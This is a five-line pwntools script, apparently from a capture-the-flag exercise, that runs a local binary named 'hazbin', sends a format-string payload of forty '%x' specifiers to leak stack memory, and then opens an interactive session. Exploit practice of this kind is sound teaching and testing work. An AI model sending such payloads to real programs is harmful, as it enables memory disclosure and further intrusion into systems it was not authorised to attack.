from pwn import *
io = process("./hazbin")  # Modify this line as needed
payload = "%x"*40
io.sendline(payload)
io.interactive()